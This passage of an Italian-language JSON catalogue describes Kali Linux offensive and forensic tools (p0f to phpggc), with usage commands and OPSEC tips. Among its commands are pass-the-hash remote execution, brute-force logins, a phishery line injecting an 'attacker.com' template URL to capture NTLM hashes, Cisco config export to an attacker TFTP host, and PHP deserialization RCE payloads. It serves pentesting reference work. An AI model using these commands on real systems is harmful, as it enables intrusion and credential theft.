    "desc": "Passive OS fingerprinting: identifica sistemi operativi analizzando traffico TCP/IP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>p0f</strong> è un tool di passive OS fingerprinting che identifica sistemi operativi, applicazioni e configurazioni di rete analizzando il traffico TCP/IP senza generare pacchetti attivi. Perfetto per reconnaissance stealth su reti monitorate.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Passive Fingerprinting:</strong> identifica OS solo osservando traffico esistente</p><p><strong>TCP/IP Analysis:</strong> analizza TTL, window size, opzioni TCP per fingerprinting</p><p><strong>Network Discovery:</strong> mappa host e sistemi su rete senza scan attivi</p><p><strong>Application Detection:</strong> identifica server web, client e altre applicazioni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Sniffing passivo su interfaccia\np0f -i eth0\n\n# Analisi da file pcap\np0f -r capture.pcap\n\n# Output su file di log\np0f -i eth0 -o results.log\n\n# Promiscuous mode per traffico non diretto\np0f -i eth0 -p</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>stealth recon</strong>, identificazione OS senza generare traffico rilevabile. Per <strong>network mapping</strong>, discovery passivo di host e servizi. Per <strong>IDS integration</strong>, arricchimento dati con fingerprint OS automatico.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Stealth:</strong> non genera traffico, completamente invisibile. <strong>Limitazioni:</strong> richiede traffico esistente da analizzare. <strong>Accuracy:</strong> fingerprint meno preciso di scan attivi, NAT può confondere.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Infrastructure",
      "Service_Fingerprinting"
    ],
    "notes": null
  },
  {
    "id": "pacu",
    "name": "pacu",
    "version": "1.6.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pacu/",
    "desc": "Framework AWS exploitation per enumeration, privilege escalation e persistence su cloud.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Pacu</strong> è un framework open-source per AWS exploitation sviluppato da Rhino Security Labs. Fornisce moduli per enumeration, privilege escalation, persistence e data exfiltration su ambienti AWS. È l'equivalente di Metasploit per cloud AWS.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Enumeration Modules:</strong> discovery IAM, EC2, S3, Lambda, RDS e altri servizi AWS</p><p><strong>Privilege Escalation:</strong> oltre 20 tecniche di privesc IAM automatizzate</p><p><strong>Persistence:</strong> creazione backdoor, chiavi API nascoste, Lambda persistenti</p><p><strong>Data Exfiltration:</strong> dump secrets, database, oggetti S3</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio Pacu\npacu\n\n# Impostazione credenziali\nset_keys\n\n# Esecuzione modulo enumeration\nrun iam__enum_users_roles_policies_groups\n\n# Privilege escalation check\nrun iam__privesc_scan\n\n# Enumeration EC2\nrun ec2__enum</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>cloud pentesting</strong>, assessment completo di sicurezza AWS. Per <strong>red team</strong>, simulazione attacchi realistici su infrastrutture cloud. Per <strong>CTF/lab</strong>, pratica su vulnerabilità IAM e misconfigurazioni AWS.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>CloudTrail:</strong> tutte le azioni sono loggate su CloudTrail. <strong>GuardDuty:</strong> enumeration intensiva triggerà alert GuardDuty. <strong>Credenziali:</strong> richiede access keys compromesse o session tokens validi.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Cloud"
    ],
    "notes": null
  },
  {
    "id": "padbuster",
    "name": "padbuster",
    "version": "0.3.3",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/padbuster/",
    "desc": "Exploita vulnerabilità padding oracle per decifrare e forgiare cookie crittografati.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PadBuster</strong> è un tool Perl per sfruttare vulnerabilità padding oracle in implementazioni CBC. Permette di decifrare dati crittografati e forgiare token validi senza conoscere la chiave, basandosi su differenze nelle risposte di errore padding.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Decrypt Mode:</strong> decifra dati crittografati sfruttando l'oracle</p><p><strong>Encrypt Mode:</strong> forgia dati crittografati validi con plaintext arbitrario</p><p><strong>Block Analysis:</strong> gestisce cifratura a blocchi CBC con varie dimensioni</p><p><strong>Encoding Support:</strong> base64, hex e altri formati di encoding</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Decrypt di un cookie vulnerabile\npadbuster http://target/app encryptedCookie 8 -cookies \"auth=encryptedCookie\"\n\n# Forgiatura nuovo valore\npadbuster http://target/app encryptedCookie 8 -plaintext \"admin=true\"\n\n# Con encoding specifico\npadbuster http://target/app data 16 -encoding 1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web exploitation</strong>, bypass autenticazione via cookie tampering. Per <strong>crypto attacks</strong>, sfruttamento implementazioni CBC vulnerabili. Per <strong>ASP.NET viewstate</strong>, attacchi su ViewState mal configurato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Requests:</strong> richiede molte richieste HTTP (256 per byte). <strong>Logging:</strong> attività facilmente rilevabile nei log. <strong>Rate limiting:</strong> applicazioni possono bloccare dopo troppi errori.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "Crypto"
    ],
    "notes": null
  },
  {
    "id": "parsero",
    "name": "parsero",
    "version": "0.81~git20140929",
    "icon": "../app/icons/parsero-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/parsero/",
    "desc": "Analizza robots.txt per trovare directory nascoste e percorsi sensibili esposti.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Parsero</strong> è un tool Python che analizza il file robots.txt di un sito web per identificare directory e percorsi che gli amministratori vogliono nascondere ai crawler. Spesso queste entry Disallow rivelano aree sensibili come admin panel e backup.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>robots.txt Parsing:</strong> estrae tutte le entry Disallow dal file</p><p><strong>Status Check:</strong> verifica se i percorsi sono effettivamente accessibili</p><p><strong>Multiple Targets:</strong> supporta scan di liste di URL</p><p><strong>Output Formats:</strong> risultati in formato standard o JSON</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi robots.txt singolo target\nparsero -u http://target.com\n\n# Con verifica accessibilità\nparsero -u http://target.com -sb\n\n# Lista di target\nparsero -f targets.txt\n\n# Output solo path accessibili\nparsero -u http://target.com -sb</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web recon</strong>, discovery rapido di percorsi interessanti. Per <strong>content discovery</strong>, identificazione admin panel, backup, config files. Per <strong>scope expansion</strong>, trovare funzionalità nascoste della webapp.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Basso rumore:</strong> singola richiesta per robots.txt iniziale. <strong>Status check:</strong> verifiche aggiuntive generano più traffico. <strong>Legale:</strong> robots.txt è pubblico, ma accesso a path sensibili potrebbe essere unauthorized.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "passdetective",
    "name": "passdetective",
    "version": "1.0.7",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/passdetective/",
    "desc": "Cerca password e secrets nella cronologia browser e file locali su sistemi compromessi.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PassDetective</strong> è un tool di credential harvesting che cerca password, secrets e informazioni sensibili nella cronologia browser, cache, file locali e application data su sistemi compromessi. Automatizza la ricerca post-exploitation.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Browser History:</strong> estrae URL con password in query string</p><p><strong>Cache Analysis:</strong> cerca credenziali in file cache browser</p><p><strong>Local Files:</strong> scansiona file comuni per password hardcoded</p><p><strong>Pattern Matching:</strong> regex customizzabili per tipi specifici di secrets</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Scan completo sistema locale\npassdetective\n\n# Scan solo browser history\npassdetective --browser-only\n\n# Con pattern custom\npassdetective --pattern \"api[_-]?key\"\n\n# Output JSON\npassdetective --output results.json</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>post-exploitation</strong>, raccolta credenziali dopo accesso a sistema. Per <strong>lateral movement</strong>, trovare password riutilizzate per altri servizi. Per <strong>forensics</strong>, analisi artefatti utente durante investigation.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Disk access:</strong> lettura file potrebbe essere monitorata da EDR. <strong>Browser profiles:</strong> accesso a profili utente richiede privilegi adeguati. <strong>Cleanup:</strong> rimuovere eventuali file temporanei creati.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Dumping"
    ],
    "notes": null
  },
  {
    "id": "passing-the-hash",
    "name": "passing-the-hash",
    "version": "0~2015.12.37",
    "icon": "../app/icons/passing-the-hash-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/passing-the-hash/",
    "desc": "Toolkit per autenticazione NTLM con hash invece di password in clear-text.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Passing-the-Hash</strong> è un toolkit che implementa la tecnica Pass-the-Hash per autenticarsi a servizi Windows usando solo l'hash NTLM, senza bisogno della password in chiaro. Include versioni modificate di smbclient, winexe e altri tool.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>PTH-smbclient:</strong> accesso SMB share usando hash NTLM</p><p><strong>PTH-winexe:</strong> esecuzione comandi remoti via hash</p><p><strong>PTH-wmic:</strong> query WMI con autenticazione hash-based</p><p><strong>PTH-rpcclient:</strong> chiamate RPC autenticate con hash</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># SMB access con hash\npth-smbclient //target/share -U domain/user%hash:ntlmhash\n\n# Esecuzione comandi remoti\npth-winexe -U domain/user%hash:ntlmhash //target cmd.exe\n\n# Query WMI\npth-wmic -U domain/user%hash:ntlmhash //target \"select * from Win32_Process\"</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>lateral movement</strong>, movimento tra sistemi con hash recuperati. Per <strong>AD exploitation</strong>, accesso a risorse con credenziali domain admin. Per <strong>persistence</strong>, mantenimento accesso senza password in chiaro.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Event logs:</strong> autenticazioni PTH loggano come normali login NTLM. <strong>Detection:</strong> SIEM possono correlare login anomali da IP inusuali. <strong>Credential Guard:</strong> mitigation Windows moderna limita efficacia PTH.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "AD_Windows",
      "Kerberos_ADCS_Relay"
    ],
    "notes": null
  },
  {
    "id": "patator",
    "name": "patator",
    "version": "1.0",
    "icon": "../app/icons/patator-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/patator/",
    "desc": "Brute forcer modulare multi-protocollo: SSH, FTP, HTTP, LDAP, SMB con threading.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Patator</strong> è un brute-forcer multi-threaded modulare che supporta numerosi protocolli e servizi. Progettato per essere più flessibile di Hydra, permette attacchi customizzati con condizioni di successo/fallimento configurabili e ottimo controllo del threading.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Multi-protocollo:</strong> SSH, FTP, SMB, HTTP, LDAP, MySQL, POP3, SMTP e molti altri</p><p><strong>Condizioni Custom:</strong> definizione flessibile di successo/fallimento</p><p><strong>Threading Avanzato:</strong> controllo granulare su parallelismo e rate limiting</p><p><strong>Combo Mode:</strong> supporto per user:pass combo lists</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Brute force SSH\npatator ssh_login host=target user=FILE0 password=FILE1 0=users.txt 1=passwords.txt\n\n# HTTP POST form\npatator http_fuzz url=http://target/login method=POST body='user=FILE0&pass=FILE1' 0=users.txt 1=pass.txt -x ignore:fgrep='Invalid'\n\n# FTP con rate limiting\npatator ftp_login host=target user=admin password=FILE0 0=passwords.txt --rate-limit=1</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>password attacks</strong>, brute-force su servizi con configurazione avanzata. Per <strong>credential stuffing</strong>, test combo lists su applicazioni. Per <strong>pentest</strong>, verifica policy password su servizi esposti.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Lockout:</strong> troppi tentativi possono bloccare account. <strong>Rate limiting:</strong> usare opzioni di throttling per evitare detection. <strong>Logging:</strong> tentativi falliti generano log abbondanti.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "03_Post_Exploitation",
      "Credentials",
      "Brute_Force"
    ],
    "notes": null
  },
  {
    "id": "patchleaks",
    "name": "patchleaks",
    "version": "0.0~git20250807.2e53978",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/patchleaks/",
    "desc": "Identifica informazioni sensibili leakate nei patch e diff di repository pubblici.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PatchLeaks</strong> è un tool che analizza patch, diff e commit di repository pubblici per identificare secrets, credenziali, API keys e altre informazioni sensibili accidentalmente incluse nei cambiamenti di codice.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Diff Analysis:</strong> scansiona diff per pattern di secrets comuni</p><p><strong>Git History:</strong> analizza storia commit per leak nel tempo</p><p><strong>Pattern Detection:</strong> rileva API keys, password, private keys, tokens</p><p><strong>Multiple Sources:</strong> supporta GitHub, GitLab, Bitbucket e repo locali</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi repository GitHub\npatchleaks https://github.com/org/repo\n\n# Scan repo locale\npatchleaks /path/to/local/repo\n\n# Analisi singolo commit\npatchleaks --commit abc123 /path/to/repo\n\n# Output JSON\npatchleaks --json https://github.com/org/repo</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>OSINT</strong>, ricerca secrets in repo pubblici di target. Per <strong>supply chain</strong>, identificazione leak in dipendenze. Per <strong>security audit</strong>, verifica assenza leak nella propria codebase.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rate limiting:</strong> API Git hanno limiti di richieste. <strong>Legal:</strong> repo pubblici sono accessibili, ma uso di secrets trovati è altra questione. <strong>Attribution:</strong> clonare repo pubblici è tracciabile.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "OSINT",
      "Domain_Intelligence"
    ],
    "notes": null
  },
  {
    "id": "pdf-parser",
    "name": "pdf-parser",
    "version": "0.7.13",
    "icon": "../app/icons/pdf-parser-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pdf-parser/",
    "desc": "Analizza struttura PDF per identificare JavaScript, stream sospetti e payload malevoli.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>pdf-parser</strong> è un tool di Didier Stevens per analizzare la struttura interna dei file PDF. Permette di esaminare oggetti, stream, JavaScript embedded e altre componenti per identificare contenuto malevolo senza eseguire il documento.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Object Parsing:</strong> estrae e visualizza tutti gli oggetti PDF</p><p><strong>Stream Decode:</strong> decodifica stream compressi FlateDecode, ASCIIHexDecode</p><p><strong>JavaScript Extract:</strong> identifica e estrae codice JavaScript embedded</p><p><strong>Reference Analysis:</strong> traccia riferimenti tra oggetti per capire flusso</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Analisi struttura PDF\npdf-parser.py malicious.pdf\n\n# Estrazione oggetto specifico\npdf-parser.py --object 10 malicious.pdf\n\n# Ricerca keyword\npdf-parser.py --search javascript malicious.pdf\n\n# Dump stream decodificato\npdf-parser.py --object 10 --filter --raw malicious.pdf</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>malware analysis</strong>, analisi statica di PDF malevoli. Per <strong>incident response</strong>, triage rapido di allegati sospetti. Per <strong>threat intel</strong>, estrazione IOC da campioni PDF.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Sicuro:</strong> analisi statica, non esegue contenuto. <strong>Isolamento:</strong> comunque consigliato analizzare in VM. <strong>Obfuscation:</strong> malware avanzato può usare obfuscation complessa.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "pdfid",
    "name": "pdfid",
    "version": "0.2.10",
    "icon": "../app/icons/pdfid-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/pdfid/",
    "desc": "Triage rapido di file PDF: conta oggetti JavaScript, OpenAction, embedded files.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>pdfid</strong> è un tool di triage rapido per PDF che conta gli oggetti potenzialmente pericolosi come JavaScript, OpenAction, embedded files, URI. Fornisce una valutazione veloce della pericolosità senza analisi approfondita.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Object Counting:</strong> conta occorrenze di keyword rischiose</p><p><strong>Quick Triage:</strong> valutazione in secondi di potenziale pericolosità</p><p><strong>Batch Analysis:</strong> analisi di directory con molti PDF</p><p><strong>Plugin Support:</strong> estensibile con plugin custom</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Triage singolo file\npdfid.py suspicious.pdf\n\n# Analisi ricorsiva directory\npdfid.py -r /path/to/pdfs/\n\n# Output extra verboso\npdfid.py -e suspicious.pdf\n\n# Con plugin aggiuntivi\npdfid.py -p plugin_triage suspicious.pdf</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>SOC triage</strong>, valutazione rapida allegati email sospetti. Per <strong>malware analysis</strong>, screening iniziale prima di analisi dettagliata. Per <strong>batch processing</strong>, filtering di grandi quantità di PDF.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Veloce:</strong> analisi in millisecondi per file. <strong>Non esaustivo:</strong> indica sospetto, non conferma malware. <strong>Complementare:</strong> usare con pdf-parser per analisi completa.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "05_Forensics",
      "Malware_Analysis"
    ],
    "notes": null
  },
  {
    "id": "peass-ng",
    "name": "peass-ng",
    "version": "20250801.03e73bf3",
    "icon": "../app/icons/peass-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/peass-ng/",
    "desc": "Script automatici per privilege escalation su Linux, Windows e macOS con output colorato.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PEASS-ng</strong> (Privilege Escalation Awesome Scripts Suite) è una collezione di script per enumerazione automatica e identificazione di vettori di privilege escalation. Include linPEAS, winPEAS e macPEAS con output colorato che evidenzia finding critici.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>linPEAS:</strong> enumeration completa Linux per privesc, incluso kernel exploits, SUID, capabilities</p><p><strong>winPEAS:</strong> enumeration Windows per privesc, servizi vulnerabili, registry, scheduled tasks</p><p><strong>macPEAS:</strong> script equivalente per sistemi macOS</p><p><strong>Colored Output:</strong> highlighting automatico di finding critici in rosso</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># LinPEAS - esecuzione completa\n./linpeas.sh\n\n# LinPEAS solo check veloci\n./linpeas.sh -s\n\n# WinPEAS via cmd\nwinpeas.exe\n\n# Output su file\n./linpeas.sh | tee linpeas_output.txt</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>privilege escalation</strong>, identificazione automatica di tutti i vettori possibili. Per <strong>CTF</strong>, enumeration rapida dopo foothold iniziale. Per <strong>security audit</strong>, verifica configurazioni sistema.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rumoroso:</strong> esegue moltissime verifiche, facilmente rilevabile. <strong>EDR:</strong> winPEAS spesso bloccato da AV/EDR. <strong>Versioni:</strong> esistono versioni obfuscate per bypass.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Multi_Platform"
    ],
    "notes": null
  },
  {
    "id": "peirates",
    "name": "peirates",
    "version": "1.1.14",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/peirates/",
    "desc": "Tool pentesting Kubernetes: enumeration, lateral movement, container escape, secrets.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Peirates</strong> è un tool di penetration testing specifico per cluster Kubernetes. Automatizza enumeration, lateral movement, estrazione secrets, container escape e privilege escalation in ambienti K8s compromessi.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Token Discovery:</strong> trova e usa service account tokens in pod compromessi</p><p><strong>Secrets Extraction:</strong> dump di tutti i secrets Kubernetes accessibili</p><p><strong>Lateral Movement:</strong> pivoting tra namespace e pod</p><p><strong>Container Escape:</strong> tecniche di escape verso node host</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio menu interattivo\npeirates\n\n# Enumeration con token specifico\npeirates -t /path/to/token\n\n# Utilizzo kubectl interno\npeirates kubectl get pods\n\n# Lista secrets accessibili\npeirates secrets</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>K8s pentesting</strong>, assessment sicurezza cluster Kubernetes. Per <strong>post-exploitation</strong>, pivoting dopo compromissione container. Per <strong>red team</strong>, simulazione attacco su infrastruttura cloud-native.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Audit Logs:</strong> azioni API Kubernetes sono loggate. <strong>RBAC:</strong> successo dipende dai permessi del service account. <strong>Detection:</strong> enumeration anomala rilevabile da K8s security tools.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Infrastructure",
      "Cloud"
    ],
    "notes": null
  },
  {
    "id": "perl-cisco-copyconfig",
    "name": "perl-cisco-copyconfig",
    "version": "1.4",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/perl-cisco-copyconfig/",
    "desc": "Script Perl per estrarre configurazione da dispositivi Cisco via SNMP e TFTP.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>perl-cisco-copyconfig</strong> è uno script Perl che sfrutta SNMP per triggerare export della configurazione di dispositivi Cisco verso un server TFTP controllato. Permette di ottenere running-config e startup-config da router e switch.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>SNMP Exploitation:</strong> usa OID Cisco per triggerare config copy</p><p><strong>TFTP Export:</strong> configurazione esportata verso server TFTP attacker</p><p><strong>Multi-device:</strong> supporta router, switch e altri dispositivi Cisco</p><p><strong>Config Types:</strong> può estrarre running-config e startup-config</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Setup server TFTP su macchina attacker\natftpd --daemon /tftp\n\n# Estrazione running-config\ncisco-copy-config.pl target_ip community_string attacker_ip\n\n# Con community string nota\ncisco-copy-config.pl 192.168.1.1 public 192.168.1.100</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>network pentest</strong>, estrazione configurazioni Cisco con SNMP esposto. Per <strong>credential harvesting</strong>, recupero password enable e credenziali da config. Per <strong>network mapping</strong>, comprensione topologia e ACL.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Logging:</strong> operazione SNMP loggata sui dispositivi. <strong>Requisiti:</strong> richiede community string con write access. <strong>TFTP:</strong> traffico TFTP visibile sulla rete.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Enumeration",
      "Infrastructure",
      "SNMP"
    ],
    "notes": null
  },
  {
    "id": "phishery",
    "name": "phishery",
    "version": "1.0.2",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/phishery/",
    "desc": "Genera documenti Office con template injection per raccolta credenziali NTLM.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Phishery</strong> è un tool che inietta URL in documenti Word per triggerare autenticazione NTLM quando aperti. La vittima che apre il documento invia automaticamente hash NTLM al server dell'attaccante per relay o cracking.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Template Injection:</strong> inietta URL in template Word esistenti</p><p><strong>NTLM Capture:</strong> server integrato per raccolta hash NTLM</p><p><strong>Stealth:</strong> documento appare normale, injection invisibile</p><p><strong>Multiple Formats:</strong> supporta .docx e altri formati Office moderni</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Avvio server e iniezione in documento\nphishery -u https://attacker.com/template -i original.docx -o malicious.docx\n\n# Avvio listener per hash\nphishery -s\n\n# Con porta custom\nphishery -s -p 8080</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>phishing</strong>, raccolta credenziali via documenti apparentemente innocui. Per <strong>initial access</strong>, cattura hash per relay o cracking. Per <strong>red team</strong>, simulazione attacco spear-phishing.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>SMB Signing:</strong> relay bloccato se SMB signing è abilitato. <strong>Firewall:</strong> vittima deve poter raggiungere server attacker. <strong>AV:</strong> alcuni antivirus rilevano template injection.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Social_Engineering"
    ],
    "notes": null
  },
  {
    "id": "photon",
    "name": "photon",
    "version": "1.3.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/photon/",
    "desc": "Web crawler veloce per estrazione URL, email, endpoint API, chiavi e secrets.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Photon</strong> è un web crawler Python veloce progettato per OSINT e reconnaissance. Estrae automaticamente URL, email, subdomini, endpoint API, chiavi, secrets e file da siti web target con parsing intelligente di JavaScript.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Fast Crawling:</strong> crawler multi-threaded per massima velocità</p><p><strong>JS Parsing:</strong> estrae endpoint e secrets da codice JavaScript</p><p><strong>Data Extraction:</strong> email, URL interni/esterni, file, subdomini automatici</p><p><strong>Secret Detection:</strong> pattern matching per API keys e token</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Crawl base di un sito\nphoton -u https://target.com\n\n# Con profondità specifica\nphoton -u https://target.com -l 3\n\n# Solo estrazione da JavaScript\nphoton -u https://target.com --only-urls\n\n# Esclusione pattern\nphoton -u https://target.com --exclude logout,signout</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>web recon</strong>, mapping completo di applicazione web. Per <strong>OSINT</strong>, raccolta email e informazioni di contatto. Per <strong>secret hunting</strong>, identificazione chiavi API esposte in frontend.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Traffico:</strong> crawling genera molte richieste, facilmente rilevabile. <strong>Rate limiting:</strong> usare opzioni di throttling per evitare blocchi. <strong>User-Agent:</strong> customizzabile per camouflage.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "01_Information_Gathering",
      "Recon",
      "Web",
      "Content_Discovery"
    ],
    "notes": null
  },
  {
    "id": "phpggc",
    "name": "phpggc",
    "version": "0.20230428",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/phpggc/",
    "desc": "Genera payload di deserialization per framework PHP: Laravel, Symfony, WordPress.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PHPGGC</strong> (PHP Generic Gadget Chains) è un tool per generare payload di object deserialization per applicazioni PHP. Include gadget chains per Laravel, Symfony, WordPress, Magento, Drupal e molti altri framework per ottenere RCE via unserialize() vulnerabile.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Gadget Library:</strong> centinaia di gadget chains per framework PHP popolari</p><p><strong>RCE Payloads:</strong> esecuzione comandi, scrittura file, SSRF</p><p><strong>Encoding Options:</strong> output base64, URL encoded, serialized</p><p><strong>Wrapper Support:</strong> phar:// wrapper per trigger automatico</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><pre><code># Lista gadget disponibili\nphpggc -l\n\n# Genera payload Laravel RCE\nphpggc Laravel/RCE1 system 'id'\n\n# Output base64\nphpggc -b Symfony/RCE4 exec 'whoami'\n\n# Genera phar file\nphpggc --phar phar Laravel/RCE1 system 'id' -o exploit.phar</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>PHP exploitation</strong>, RCE via vulnerabilità unserialize(). Per <strong>web pentesting</strong>, test applicazioni con deserializzazione insicura. Per <strong>PHAR exploitation</strong>, attacchi via phar:// wrapper.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Requisiti:</strong> target deve avere libreria/framework vulnerabile installato. <strong>Version Match:</strong> gadget chain deve corrispondere a versione target. <strong>WAF:</strong> payload serializzati possono essere 